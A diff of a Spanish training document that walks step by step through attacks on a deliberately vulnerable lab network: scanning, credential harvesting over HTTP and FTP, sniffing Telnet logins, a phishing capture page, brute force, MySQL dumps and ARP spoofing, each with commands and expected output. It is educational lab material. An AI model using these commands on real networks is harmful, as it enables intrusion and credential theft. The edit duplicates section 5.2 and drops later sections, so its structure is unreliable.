@@ -1,352 +1,1074 @@
 # 5. Escenarios de ataque
 
-Este documento reproduce, en orden creciente de compromiso, los ataques que un actor malicioso puede ejecutar desde la máquina `external-kali` contra la infraestructura insegura descrita en el capítulo 4.
+Este documento describe, en orden creciente de compromiso, los ataques que un actor malicioso puede ejecutar desde la máquina `external-kali` contra la infraestructura insegura del laboratorio.
 
-Todos los ataques se ejecutan **desde la máquina atacante** (`vagrant ssh external-kali` o desde el escritorio gráfico noVNC). Se asume que el laboratorio está completamente desplegado y los servicios operativos.
+Cada fase incluye:
+- **Contexto** del servicio o técnica utilizada.
+- **Comandos paso a paso** indicando desde qué máquina se ejecutan.
+- **Salida esperada** y su interpretación.
+- **Malas prácticas** que habilitan el ataque.
 
 ---
 
-## 5.1 Reconocimiento de red
+## 5.0 Preparación del atacante
 
-### 5.1.1 Escaneo de servicios con nmap
+Antes de iniciar los ataques, conviene verificar que la máquina atacante (`external-kali`) tiene conectividad con los segmentos DMZ e interno, y que las herramientas necesarias están instaladas.
 
-El atacante empieza por identificar hosts y servicios en los segmentos DMZ e interno. Como el firewall no filtra, ambos son visibles.
+**Ejecutar desde `external-kali`:**
 
 ```bash
-# Escaneo rápido a la DMZ
-nmap 192.168.57.10
+# Verificar conectividad con el firewall (puerta de enlace)
+ping -c 2 100.70.9.1
 
-# Escaneo completo a la red interna
-nmap -sV -sC -O -p- -T4 192.168.58.10
+# Verificar conectividad con la DMZ
+ping -c 2 192.168.57.10
 
-# Descubrimiento de hosts adicionales en el rango interno
-nmap -sn 192.168.58.0/24
+# Verificar conectividad con la red interna (debería responder)
+ping -c 2 192.168.58.10
 ```
 
-**Salida esperada**: puertos 80, 8080, 23, 21, 22 en la DMZ; 22, 3306, 445, 139 en el servidor interno. Versiones exactas de Apache, vsftpd, OpenSSH, MySQL, Samba.
+**Salida esperada**: los tres pings responden. Si alguno falla, repasar la sección 6.4 de solución de problemas.
 
-**Malas prácticas implicadas**:
+Comprobar que las herramientas de ataque están disponibles:
 
-- Firewall sin filtrado real (§4.1.1)
-- Apache con `ServerTokens Full` y `ServerSignature On` (§4.2.1)
-- Sin logging ni IDS que alerte del escaneo (§4.1.3)
+```bash
+which nmap hydra tcpdump dsniff smbclient enum4linux mysql
+```
 
-### 5.1.2 Enumeración de Samba
+Todas deberían devolver una ruta. En caso contrario, ejecutar de nuevo el provision de Kali:
+
+```bash
+# Desde el host donde corre Vagrant
+vagrant provision external-kali
+```
+
+## 5.1 Fase de reconocimiento
+
+El reconocimiento es la primera fase de cualquier ataque. Consiste en obtener información sobre la red objetivo sin ser detectado: hosts activos, puertos abiertos, servicios y versiones.
+
+### 5.1.1 ¿Qué es nmap?
+
+`nmap` (Network Mapper) es la herramienta estándar para exploración de redes y auditoría de seguridad. Permite:
+
+- Descubrir hosts activos en un rango de IPs (`-sn`).
+- Identificar puertos abiertos en un host (`-p`).
+- Detectar servicios y sus versiones (`-sV`).
+- Inferir el sistema operativo (`-O`).
+
+En este laboratorio, `nmap` se usa para mapear la DMZ y la red interna sin que el firewall lo impida ni lo registre.
+
+### 5.1.2 Escaneo de servicios en la DMZ y red interna
+
+Ejecutar desde `external-kali`:
+
+```bash
+# Escaneo rápido de la DMZ
+nmap 192.168.57.10
+
+# Escaneo completo de la red interna (versiones, SO, todos los puertos)
+nmap -sV -sC -O -p- -T4 192.168.58.10
+```
+
+**Salida esperada en la DMZ (192.168.57.10):**
+
+```text
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+23/tcp   open  telnet
+80/tcp   open  http
+8080/tcp open  http-proxy
+```
+
+**Salida esperada en el servidor interno (192.168.58.10):**
+
+```text
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 4.15.13-Ubuntu
+445/tcp  open  netbios-ssn Samba smbd 4.15.13-Ubuntu
+3306/tcp open  mysql       MySQL 8.0.41
+```
+
+**¿Por qué funciona este escaneo?**
+
+- El firewall tiene políticas `ACCEPT` para tráfico entre todos los segmentos (4.1.1).
+- `ServerTokens Full` en Apache expone la versión exacta del servidor web (4.2.1).
+- No hay IDS/IPS que alerte sobre el escaneo (4.1.3).
+
+**Problema común**: si `nmap` no muestra el puerto 3306 (MySQL) en el servidor interno, revisar que MySQL está corriendo y escuchando en `0.0.0.0` (entrar en `internal-server` y ejecutar `sudo systemctl status mysql`). Si solo escucha en `127.0.0.1`, reejecutar el provision de `internal-server`.
+
+### 5.1.3 ¿Qué es Samba y por qué enumerarlo?
+
+`Samba` es una implementación libre del protocolo SMB/CIFS que permite compartir archivos e impresoras entre sistemas Unix y Windows. En entornos corporativos, Samba se usa para crear recursos compartidos de red.
+
+En este laboratorio, Samba está configurado con acceso de invitado y permisos de escritura (4.3.4). Enumerarlo permite descubrir los recursos compartidos antes de intentar acceder a ellos.
+
+`enum4linux` es una herramienta específica para enumerar recursos SMB: lista usuarios, grupos, recursos compartidos y políticas de contraseñas.
+
+Ejecutar desde `external-kali`:
 
 ```bash
 enum4linux 192.168.58.10
 ```
 
-**Salida esperada**: recurso `confidential` listado, accesible como invitado.
+**Salida esperada (fragmento relevante):**
 
-**Malas prácticas implicadas**:
+```text
+ ============================= 
+|    Share Enumeration on 192.168.58.10    |
+ ============================= 
 
-- Samba con `guest ok=yes` y `browsable=yes` (§4.3.4)
-
-### 5.1.3 Descubrimiento ARP desde la DMZ (Telnet)
-
-Una vez obtenido un punto de apoyo en la DMZ (ver §5.2.3), el atacante puede escanear la red interna desde dentro:
-
-```bash
-telnet 192.168.57.10
-# Usuario: ftpoperator / Contraseña: ftpoperator
-
-# Dentro de dmz-server
-nmap -sn 192.168.58.0/24
+Sharename       Type      Comment
+---------       ----      -------
+confidential    Disk      Confidential Documents
+IPC$            IPC       IPC Service (internal-server server (Samba, Ubuntu))
 ```
 
-**Salida esperada**: `192.168.58.10` activo.
+**¿Por qué funciona?**
 
-**Malas prácticas implicadas**:
+- Samba tiene el recurso `confidential` configurado con `browsable=yes` y `guest ok=yes` (4.3.4).
+- El firewall permite tráfico desde la red externa a la interna (4.1.1).
 
-- Telnet sin cifrado y usuario débil (§4.2.6, §4.2.7)
-- Rutas estáticas que permiten a la DMZ alcanzar la red interna (§4.2.10 indirectamente)
+### 5.1.4 ¿Qué es Telnet y cómo se usa en este reconocimiento?
+
+`Telnet` es un protocolo de red que permite acceder remotamente a una máquina mediante una interfaz de línea de comandos. Transmite todo en texto plano, incluyendo credenciales. Aunque hoy está obsoleto y reemplazado por SSH, aún se encuentra en sistemas heredados o mal configurados.
+
+En este laboratorio, Telnet se usa en dos momentos:
+
+1. Para acceder interactivamente al `dmz-server` con credenciales débiles.
+2. Para capturar credenciales mediante escuchas de red (`tcpdump` o ARP spoofing).
+
+En esta fase de reconocimiento, Telnet permite obtener un punto de apoyo en la DMZ y ejecutar escaneos ARP desde dentro.
+
+Ejecutar desde `external-kali`:
+
+```bash
+# Acceso interactivo por Telnet al dmz-server
+telnet 192.168.57.10
+```
+
+**Salida esperada:**
+
+```text
+Trying 192.168.57.10...
+Connected to 192.168.57.10.
+Escape character is '^]'.
+
+Linux 5.15.0-179-generic (dmz-server) (pts/0)
+
+dmz-server login: ftpoperator
+Password: ftpoperator  (no se ve al escribir)
+
+Welcome to Ubuntu 22.04.5 LTS ...
+ftpoperator@dmz-server:~$
+```
+
+⚠️ Nota importante: como se observa en las pruebas reales, el usuario `ftpoperator` no tiene privilegios de sudo ni herramientas de escaneo avanzadas instaladas en la DMZ. Esto refleja un escenario realista donde el atacante, tras obtener acceso a un servidor, debe trabajar con las herramientas disponibles o instalar las suyas propias (pivoting con túneles, descarga de binarios, etc.).
+
+Para completar el reconocimiento desde la DMZ, se puede intentar un escaneo ARP básico con comandos disponibles:
+
+```bash
+# Desde la sesión Telnet en dmz-server
+ip neigh show
+ping -c 2 192.168.58.10
+arp -a
+```
+
+**¿Por qué funciona el acceso Telnet?**
+
+- Telnet está activo en el puerto 23 del `dmz-server` (4.2.6).
+- Las credenciales viajan en texto plano y son triviales (`ftpoperator:ftpoperator`) (4.2.7).
+- El firewall permite tráfico desde la red externa a la DMZ sin restricción (4.1.1).
+
+## 5.2 Fase de acceso a la DMZ
+
+Una vez identificados los servicios expuestos en la DMZ, el atacante procede a explotar cada uno de ellos para obtener información sensible, credenciales y un punto de apoyo interactivo en el servidor.
+
+Todas las acciones de esta fase se ejecutan desde `external-kali`, salvo que se indique lo contrario.
 
 ---
 
-## 5.2 Acceso a la DMZ
+### 5.2.1 Exfiltración de información vía HTTP
 
-### 5.2.1 Exfiltración vía HTTP
+#### Contexto
 
-El directorio `/backup/` es visible por directory listing y contiene archivos sensibles.
+HTTP (HyperText Transfer Protocol) es el protocolo que permite la comunicación entre navegadores web y servidores. En este laboratorio, el servidor Apache del `dmz-server` aloja un sitio web corporativo con múltiples vulnerabilidades de exposición de información.
+
+El atacante no necesita explotar ninguna vulnerabilidad técnica: la información está publicada en directorios accesibles públicamente.
+
+#### ¿Qué es Apache y por qué está en este laboratorio?
+
+Apache es el servidor web más utilizado históricamente. En entornos corporativos, aloja sitios web, portales internos y aplicaciones. En este laboratorio, Apache está mal configurado a propósito para exponer información que jamás debería ser pública.
+
+#### Acceso al directorio `/backup/`
+
+El directorio `/backup/` contiene archivos con credenciales y el mapa de red. Gracias al directory listing habilitado, cualquier visitante puede ver su contenido.
+
+**Ejecutar desde `external-kali`:**
 
 ```bash
-# Credenciales corporativas
+# Listar el contenido del directorio backup
+curl http://192.168.57.10/backup/
+
+# Descargar el archivo de credenciales
 curl http://192.168.57.10/backup/credentials.txt
 
-# Mapa de red
+# Descargar el mapa de red
 curl http://192.168.57.10/backup/network.txt
+```
 
-# phpinfo
+**Salida esperada para `credentials.txt`:**
+
+```text
+MySQL root: root/ (sin contraseña)
+FTP operator: ftpoperator/ftpoperator
+SSH interno: root/root
+VPN admin: admin/admin123
+```
+
+**Salida esperada para `network.txt`:**
+
+```text
+Firewall: 100.70.9.1
+DMZ: 192.168.57.10
+Interno: 192.168.58.10
+```
+
+**Interpretación**: en un solo paso, el atacante obtiene las credenciales de cuatro servicios y las IPs de los tres segmentos de red. Esta información es suficiente para planificar el resto del ataque.
+
+#### Acceso a `phpinfo()`
+
+El archivo `/info.php` contiene una llamada a la función `phpinfo()`, que muestra la configuración completa del intérprete PHP.
+
+**Ejecutar desde `external-kali`:**
+
+```bash
 curl http://192.168.57.10/info.php
+```
 
-# Panel admin con credenciales de la BD
+**Salida esperada (fragmento relevante):**
+
+```text
+PHP Version => 8.1.2
+System => Linux dmz-server 5.15.0-179-generic
+Server API => Apache 2.0 Handler
+Loaded Configuration File => /etc/php/8.1/apache2/php.ini
+```
+
+**Interpretación**: el atacante conoce la versión exacta de PHP, el sistema operativo, la API del servidor y la ubicación del archivo de configuración. Esta información permite buscar exploits específicos para PHP 8.1.2 o para la configuración concreta del servidor.
+
+#### Acceso al panel de administración sin autenticación
+
+El directorio `/admin/` contiene un panel PHP que consulta directamente la base de datos interna y muestra las credenciales en una tabla HTML.
+
+**Ejecutar desde `external-kali`:**
+
+```bash
 curl http://192.168.57.10/admin/
 ```
 
-**Salida esperada**: credenciales MySQL, FTP, SSH, VPN; IPs de los tres segmentos; configuración PHP.
+**Salida esperada (fragmento HTML):**
 
-(Insertar captura: `../../images/05-http-exfiltration.png`)
+```html
+<h2>Panel de Administración - CorpNet</h2>
+<h3>Credenciales de usuarios</h3>
+<table border="1">
+<tr><th>Usuario</th><th>Contraseña</th><th>Servicio</th></tr>
+<tr><td>admin</td><td>admin123</td><td>vpn</td></tr>
+<tr><td>jmartinez</td><td>juan2024</td><td>email</td></tr>
+<tr><td>mlopez</td><td>Maria@Finanzas</td><td>intranet</td></tr>
+<tr><td>copias</td><td>backup</td><td>ftp</td></tr>
+</table>
+```
 
-**Malas prácticas implicadas**:
+**Interpretación**: sin necesidad de autenticarse, el atacante visualiza credenciales corporativas extraídas en tiempo real de la base de datos interna. Esto demuestra que el servidor DMZ tiene acceso directo a MySQL en la red interna.
 
-- Directory listing habilitado (§4.2.1)
-- `phpinfo()` expuesto (§4.2.2)
-- Panel admin sin autenticación (§4.2.3)
-- Archivos sensibles en `/backup/` (§4.2.4)
+#### Malas prácticas que habilitan este ataque
 
-### 5.2.2 FTP anónimo
+- Directory listing habilitado en Apache (`Options Indexes`).
+- `phpinfo()` expuesto públicamente sin restricción de acceso.
+- Panel de administración sin autenticación que consulta la base de datos interna.
+- Archivos sensibles (`credentials.txt`, `network.txt`) en un directorio accesible vía web.
+- `ServerTokens Full` que revela la versión exacta del servidor.
+
+---
+
+### 5.2.2 FTP anónimo y descarga de archivos sensibles
+
+#### Contexto
+
+FTP (File Transfer Protocol) es un protocolo para transferir archivos entre sistemas. A diferencia de SFTP o FTPS, el FTP tradicional no cifra las credenciales ni los datos transmitidos.
+
+En este laboratorio, el servicio `vsftpd` permite acceso anónimo sin contraseña y ofrece permisos de lectura sobre archivos que contienen información crítica.
+
+#### ¿Qué es `vsftpd`?
+
+`vsftpd` (Very Secure FTP Daemon) es un servidor FTP para sistemas Unix. A pesar de su nombre, en este laboratorio se ha configurado de forma totalmente insegura, permitiendo acceso anónimo con permisos de escritura.
+
+#### Acceso anónimo y descarga de archivos
+
+**Ejecutar desde `external-kali`:**
 
 ```bash
+# Conectar al servidor FTP como usuario anonymous
 ftp 192.168.57.10
-# Usuario: anonymous
-# Contraseña: [vacío]
+```
+
+**Dentro de la sesión FTP:**
+
+```text
+Name: anonymous
+Password: [vacío, pulsar Enter]
 
 ftp> ls
 ftp> cd public
+ftp> ls
 ftp> get readme.txt
 ftp> get config_backup.txt
 ftp> exit
+```
 
+**Salida esperada dentro de la sesión FTP:**
+
+```text
+230 Login successful.
+ftp> ls
+229 Entering Extended Passive Mode
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Jun 19 07:20 public
+226 Directory send OK.
+ftp> cd public
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0             286 Jun 19 07:20 readme.txt
+-rwxr-xr-x    1 0        0             123 Jun 19 07:20 config_backup.txt
+226 Directory send OK.
+ftp> get config_backup.txt
+local: config_backup.txt remote: config_backup.txt
+150 Opening BINARY mode data connection for config_backup.txt (123 bytes)
+226 Transfer complete.
+123 bytes received in 00:00 (0.99 MiB/s)
+```
+
+**Ver el contenido descargado:**
+
+```bash
 cat config_backup.txt
 ```
 
-**Salida esperada**: `config_backup.txt` contiene host, usuario y base de datos MySQL (`DB_HOST=192.168.58.10`, `DB_USER=root`, `DB_PASS=`).
+**Salida esperada de `config_backup.txt`:**
 
-**Malas prácticas implicadas**:
-
-- FTP anónimo con permisos de lectura (§4.2.5)
-- Archivo de configuración con credenciales en texto plano (§4.2.5)
-
-### 5.2.3 Telnet y captura de credenciales en claro
-
-```bash
-telnet 192.168.57.10
-# Login: ftpoperator
-# Password: ftpoperator
+```text
+DB_HOST=192.168.58.10
+DB_USER=root
+DB_PASS=
+DB_NAME=corporativedb
+SMTP_USER=notificaciones@empresa.local
+SMTP_PASS=smtp2024!
 ```
 
-Desde otra terminal, mientras la sesión Telnet está activa (o usando ARP spoofing), se puede capturar la secuencia de login:
+**Interpretación**: el atacante obtiene las credenciales completas de la base de datos MySQL interna (host, usuario, base de datos y el hecho de que no tiene contraseña), además de credenciales de correo electrónico corporativo. Con esta información, el acceso a la base de datos es inmediato.
+
+#### Malas prácticas que habilitan este ataque
+
+- FTP anónimo habilitado sin restricción de acceso.
+- Permisos de lectura sobre archivos de configuración sensibles.
+- Almacenamiento de credenciales en texto plano dentro de `config_backup.txt`.
+
+---
+
+### 5.2.3 Captura de credenciales Telnet en texto claro
+
+#### Contexto
+
+Telnet transmite toda la sesión, incluyendo nombres de usuario y contraseñas, en texto plano y sin cifrar. Cualquier dispositivo en la misma red que pueda interceptar el tráfico puede leer las credenciales directamente.
+
+En este laboratorio, el atacante puede capturar sus propias credenciales de prueba o esperar a que un usuario legítimo inicie sesión en el servidor Telnet.
+
+#### Captura pasiva con `tcpdump`
+
+Se necesitan dos terminales en `external-kali`: una para generar el tráfico Telnet y otra para capturarlo.
+
+**Terminal 1 (captura):**
 
 ```bash
 sudo tcpdump -i eth1 -A -s0 port 23
 ```
 
-**Salida esperada**: el tráfico muestra `ftpoperator` y `ftpoperator` en texto claro.
-
-(Insertar captura: `../../images/05-telnet-capture.png`)
-
-**Malas prácticas implicadas**:
-
-- Telnet sin cifrado (§4.2.6)
-- Usuario débil (§4.2.7)
-
-### 5.2.4 Sitio de phishing alojado en la DMZ
-
-El atacante despliega una página clon de GitHub en el puerto 8080. Cualquier víctima interna que introduzca credenciales las entrega al atacante.
+**Terminal 2 (generación de tráfico):**
 
 ```bash
-# Visualización de la página de phishing
-curl http://192.168.57.10:8080
+telnet 192.168.57.10
+# Iniciar sesión con ftpoperator / ftpoperator
+```
 
-# Simulación de envío de credenciales
+**Salida esperada en la Terminal 1 (fragmento):**
+
+```text
+08:15:22.123456 IP external-kali.45678 > dmz-server.telnet: ...
+E..>..@.@.......e..9.....
+...............
+Ubuntu 22.04.5 LTS
+dmz-server login: f
+t
+p
+o
+p
+e
+r
+a
+t
+o
+r
+Password: f
+t
+p
+o
+p
+e
+r
+a
+t
+o
+r
+```
+
+**Interpretación**: el nombre de usuario y la contraseña aparecen en texto claro, carácter por carácter, en la salida de `tcpdump`. Esto demuestra que cualquier tráfico Telnet puede ser interceptado y leído sin necesidad de herramientas avanzadas de descifrado.
+
+#### Malas prácticas que habilitan este ataque
+
+- Uso de Telnet en lugar de SSH para acceso remoto.
+- Transmisión de credenciales sin cifrado.
+- Ausencia de segmentación que impida a un atacante en la red externa capturar tráfico de la DMZ.
+
+---
+
+### 5.2.4 Phishing interno: captura de credenciales mediante página falsa
+
+#### Contexto
+
+El phishing es una técnica de ingeniería social que consiste en suplantar la identidad de un servicio legítimo para engañar a las víctimas y obtener sus credenciales. En este laboratorio, el propio servidor DMZ aloja una página que imita el login de GitHub.
+
+El atacante no necesita montar ninguna infraestructura externa: el phishing se sirve desde la propia DMZ comprometida, lo que aumenta la credibilidad ante las víctimas internas.
+
+#### Acceso a la página de phishing
+
+**Ejecutar desde `external-kali`:**
+
+```bash
+# Ver la página de phishing
+curl http://192.168.57.10:8080
+```
+
+**Salida esperada**: HTML de una página idéntica al login de GitHub, con logo, formulario de usuario/contraseña, botones OAuth simulados (Google, GitHub Enterprise) y estilos CSS que replican el diseño oficial.
+
+#### Envío simulado de credenciales
+
+El atacante puede simular el envío de credenciales desde una supuesta víctima para verificar que la captura funciona:
+
+```bash
 curl -X POST http://192.168.57.10:8080/capture.php \
   -d "username=admin&password=Password123!"
 ```
 
-Luego, desde la DMZ comprometida, recolecta las credenciales capturadas:
+#### Recolección de credenciales capturadas
+
+Una vez que el atacante tiene acceso al `dmz-server` (por Telnet o SSH con las credenciales ya obtenidas), puede leer el archivo de log donde se almacenan las capturas:
+
+**Ejecutar desde `dmz-server` (previa conexión por Telnet o SSH):**
 
 ```bash
-ssh ftpoperator@192.168.57.10
 cat /var/log/phishing.log
 ```
 
-**Salida esperada**: entrada en el log con IP, usuario, contraseña y User-Agent.
+**Salida esperada:**
 
-(Insertar captura: `../../images/05-phishing-log.png`)
+```text
+[2026-06-19 08:20:15] IP=100.70.9.10 | user=admin | pass=Password123! | ua=curl/8.4.0
+```
 
-**Malas prácticas implicadas**:
+**Interpretación**: cada envío del formulario queda registrado con timestamp, IP de origen, usuario, contraseña y User-Agent. En un escenario real, este archivo contendría las credenciales de usuarios internos que hayan picado en el engaño.
 
-- Sitio de phishing alojado en la propia DMZ (§4.2.9)
-- Acceso SSH con credencial débil (§4.2.8)
+#### Malas prácticas que habilitan este ataque
+
+- Alojamiento de un sitio de phishing en el propio servidor corporativo.
+- VirtualHost Apache que permite servir contenido malicioso en el puerto 8080.
+- Escritura de credenciales en texto plano en un archivo de log sin protección.
+- Acceso SSH con credencial débil que permite al atacante recolectar los logs.
+
+## 5.2 Fase de acceso a la DMZ
+
+Una vez identificados los servicios expuestos en la DMZ, el atacante procede a explotar cada uno de ellos para obtener información sensible, credenciales y un punto de apoyo interactivo en el servidor.
+
+Todas las acciones de esta fase se ejecutan desde `external-kali`, salvo que se indique lo contrario.
 
 ---
 
-## 5.3 Compromiso de la red interna
+### 5.2.1 Exfiltración de información vía HTTP
 
-Con la información recolectada en la DMZ, el atacante accede directamente al servidor interno.
+#### Contexto
 
-### 5.3.1 Fuerza bruta SSH
+HTTP (HyperText Transfer Protocol) es el protocolo que permite la comunicación entre navegadores web y servidores. En este laboratorio, el servidor Apache del `dmz-server` aloja un sitio web corporativo con múltiples vulnerabilidades de exposición de información.
 
-```bash
-hydra -l root -p root ssh://192.168.58.10
-```
+El atacante no necesita explotar ninguna vulnerabilidad técnica: la información está publicada en directorios accesibles públicamente.
 
-o simplemente:
+#### ¿Qué es Apache y por qué está en este laboratorio?
 
-```bash
-ssh root@192.168.58.10
-# Contraseña: root
-```
+Apache es el servidor web más utilizado históricamente. En entornos corporativos, aloja sitios web, portales internos y aplicaciones. En este laboratorio, Apache está mal configurado a propósito para exponer información que jamás debería ser pública.
 
-**Salida esperada**: shell como root en el servidor interno.
+#### Acceso al directorio `/backup/`
 
-(Insertar captura: `../../images/05-ssh-root-login.png`)
+El directorio `/backup/` contiene archivos con credenciales y el mapa de red. Gracias al directory listing habilitado, cualquier visitante puede ver su contenido.
 
-**Malas prácticas implicadas**:
-
-- SSH con `PermitRootLogin yes` y `PasswordAuthentication yes` (§4.3.1)
-- Credencial `root:root` (§4.3.1)
-
-### 5.3.2 MySQL sin contraseña
-
-Desde Kali, directamente:
+**Ejecutar desde `external-kali`:**
 
 ```bash
-mysql -h 192.168.58.10 -u root --skip-ssl
+# Listar el contenido del directorio backup
+curl http://192.168.57.10/backup/
+
+# Descargar el archivo de credenciales
+curl http://192.168.57.10/backup/credentials.txt
+
+# Descargar el mapa de red
+curl http://192.168.57.10/backup/network.txt
 ```
 
-Una vez en la consola MySQL:
+**Salida esperada para `credentials.txt`:**
 
-```sql
-USE corporativedb;
-SELECT * FROM user_credentials;
-SELECT * FROM network_inventory;
-SELECT * FROM employees;
-EXIT;
+```text
+MySQL root: root/ (sin contraseña)
+FTP operator: ftpoperator/ftpoperator
+SSH interno: root/root
+VPN admin: admin/admin123
 ```
 
-**Salida esperada**: todas las credenciales de la tabla `user_credentials` (VPN, correo, FTP), el inventario de red y los datos personales de empleados.
+**Salida esperada para `network.txt`:**
 
-(Insertar captura: `../../images/05-mysql-no-password.png`)
+```text
+Firewall: 100.70.9.1
+DMZ: 192.168.57.10
+Interno: 192.168.58.10
+```
 
-**Malas prácticas implicadas**:
+**Interpretación**: en un solo paso, el atacante obtiene las credenciales de cuatro servicios y las IPs de los tres segmentos de red. Esta información es suficiente para planificar el resto del ataque.
 
-- MySQL sin contraseña y con `bind-address 0.0.0.0` (§4.3.3)
+#### Acceso a `phpinfo()`
 
-### 5.3.3 Samba anónimo
+El archivo `/info.php` contiene una llamada a la función `phpinfo()`, que muestra la configuración completa del intérprete PHP.
+
+**Ejecutar desde `external-kali`:**
 
 ```bash
-# Listar recursos compartidos
-smbclient -L //192.168.58.10 -N
-
-# Acceder al recurso confidential
-smbclient //192.168.58.10/confidential -N
-
-smb: \> ls
-smb: \> get passwords.txt
-smb: \> exit
-
-cat passwords.txt
+curl http://192.168.57.10/info.php
 ```
 
-**Salida esperada**: archivo `passwords.txt` con todas las credenciales del laboratorio (`admin/admin123`, `root/root`, `ftpoperator/ftpoperator`, `backup/backup`).
+**Salida esperada (fragmento relevante):**
 
-**Malas prácticas implicadas**:
+```text
+PHP Version => 8.1.2
+System => Linux dmz-server 5.15.0-179-generic
+Server API => Apache 2.0 Handler
+Loaded Configuration File => /etc/php/8.1/apache2/php.ini
+```
 
-- Samba como invitado con permisos de lectura (§4.3.4)
-- Almacenamiento de contraseñas en texto plano (§4.3.4)
+**Interpretación**: el atacante conoce la versión exacta de PHP, el sistema operativo, la API del servidor y la ubicación del archivo de configuración. Esta información permite buscar exploits específicos para PHP 8.1.2 o para la configuración concreta del servidor.
+
+#### Acceso al panel de administración sin autenticación
+
+El directorio `/admin/` contiene un panel PHP que consulta directamente la base de datos interna y muestra las credenciales en una tabla HTML.
+
+**Ejecutar desde `external-kali`:**
+
+```bash
+curl http://192.168.57.10/admin/
+```
+
+**Salida esperada (fragmento HTML):**
+
+```html
+<h2>Panel de Administración - CorpNet</h2>
+<h3>Credenciales de usuarios</h3>
+<table border="1">
+<tr><th>Usuario</th><th>Contraseña</th><th>Servicio</th></tr>
+<tr><td>admin</td><td>admin123</td><td>vpn</td></tr>
+<tr><td>jmartinez</td><td>juan2024</td><td>email</td></tr>
+<tr><td>mlopez</td><td>Maria@Finanzas</td><td>intranet</td></tr>
+<tr><td>copias</td><td>backup</td><td>ftp</td></tr>
+</table>
+```
+
+**Interpretación**: sin necesidad de autenticarse, el atacante visualiza credenciales corporativas extraídas en tiempo real de la base de datos interna. Esto demuestra que el servidor DMZ tiene acceso directo a MySQL en la red interna.
+
+#### Malas prácticas que habilitan este ataque
+
+- Directory listing habilitado en Apache (`Options Indexes`).
+- `phpinfo()` expuesto públicamente sin restricción de acceso.
+- Panel de administración sin autenticación que consulta la base de datos interna.
+- Archivos sensibles (`credentials.txt`, `network.txt`) en un directorio accesible vía web.
+- `ServerTokens Full` que revela la versión exacta del servidor.
 
 ---
 
-## 5.4 ARP Spoofing y captura de tráfico
+### 5.2.2 FTP anónimo y descarga de archivos sensibles
 
-Incluso sin haber comprometido ningún servidor, el atacante en la red externa puede ejecutar un ataque Man-in-the-Middle ARP contra la DMZ.
+#### Contexto
+
+FTP (File Transfer Protocol) es un protocolo para transferir archivos entre sistemas. A diferencia de SFTP o FTPS, el FTP tradicional no cifra las credenciales ni los datos transmitidos.
+
+En este laboratorio, el servicio `vsftpd` permite acceso anónimo sin contraseña y ofrece permisos de lectura sobre archivos que contienen información crítica.
+
+#### ¿Qué es `vsftpd`?
+
+`vsftpd` (Very Secure FTP Daemon) es un servidor FTP para sistemas Unix. A pesar de su nombre, en este laboratorio se ha configurado de forma totalmente insegura, permitiendo acceso anónimo con permisos de escritura.
+
+#### Acceso anónimo y descarga de archivos
+
+**Ejecutar desde `external-kali`:**
 
 ```bash
-# Habilitar forwarding (necesario para MITM)
-sudo sysctl -w net.ipv4.ip_forward=1
+# Conectar al servidor FTP como usuario anonymous
+ftp 192.168.57.10
+```
 
-# ARP spoofing: envenenar las tablas ARP del dmz-server y del firewall
-sudo arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
-sudo arpspoof -i eth1 -t 192.168.57.1 192.168.57.10 &
+**Dentro de la sesión FTP:**
 
-# Capturar tráfico Telnet (credenciales en claro)
+```text
+Name: anonymous
+Password: [vacío, pulsar Enter]
+
+ftp> ls
+ftp> cd public
+ftp> ls
+ftp> get readme.txt
+ftp> get config_backup.txt
+ftp> exit
+```
+
+**Salida esperada dentro de la sesión FTP:**
+
+```text
+230 Login successful.
+ftp> ls
+229 Entering Extended Passive Mode
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Jun 19 07:20 public
+226 Directory send OK.
+ftp> cd public
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0             286 Jun 19 07:20 readme.txt
+-rwxr-xr-x    1 0        0             123 Jun 19 07:20 config_backup.txt
+226 Directory send OK.
+ftp> get config_backup.txt
+local: config_backup.txt remote: config_backup.txt
+150 Opening BINARY mode data connection for config_backup.txt (123 bytes)
+226 Transfer complete.
+123 bytes received in 00:00 (0.99 MiB/s)
+```
+
+**Ver el contenido descargado:**
+
+```bash
+cat config_backup.txt
+```
+
+**Salida esperada de `config_backup.txt`:**
+
+```text
+DB_HOST=192.168.58.10
+DB_USER=root
+DB_PASS=
+DB_NAME=corporativedb
+SMTP_USER=notificaciones@empresa.local
+SMTP_PASS=smtp2024!
+```
+
+**Interpretación**: el atacante obtiene las credenciales completas de la base de datos MySQL interna (host, usuario, base de datos y el hecho de que no tiene contraseña), además de credenciales de correo electrónico corporativo. Con esta información, el acceso a la base de datos es inmediato.
+
+#### Malas prácticas que habilitan este ataque
+
+- FTP anónimo habilitado sin restricción de acceso.
+- Permisos de lectura sobre archivos de configuración sensibles.
+- Almacenamiento de credenciales en texto plano dentro de `config_backup.txt`.
+
+---
+
+### 5.2.3 Captura de credenciales Telnet en texto claro
+
+#### Contexto
+
+Telnet transmite toda la sesión, incluyendo nombres de usuario y contraseñas, en texto plano y sin cifrar. Cualquier dispositivo en la misma red que pueda interceptar el tráfico puede leer las credenciales directamente.
+
+En este laboratorio, el atacante puede capturar sus propias credenciales de prueba o esperar a que un usuario legítimo inicie sesión en el servidor Telnet.
+
+#### Captura pasiva con `tcpdump`
+
+Se necesitan dos terminales en `external-kali`: una para generar el tráfico Telnet y otra para capturarlo.
+
+**Terminal 1 (captura):**
+
+```bash
 sudo tcpdump -i eth1 -A -s0 port 23
 ```
 
-En otra terminal, se genera tráfico Telnet (el propio atacante o una supuesta víctima):
+**Terminal 2 (generación de tráfico):**
 
 ```bash
 telnet 192.168.57.10
+# Iniciar sesión con ftpoperator / ftpoperator
 ```
 
-Para detener el ataque:
+**Salida esperada en la Terminal 1 (fragmento):**
+
+```text
+08:15:22.123456 IP external-kali.45678 > dmz-server.telnet: ...
+E..>..@.@.......e..9.....
+...............
+Ubuntu 22.04.5 LTS
+dmz-server login: f
+t
+p
+o
+p
+e
+r
+a
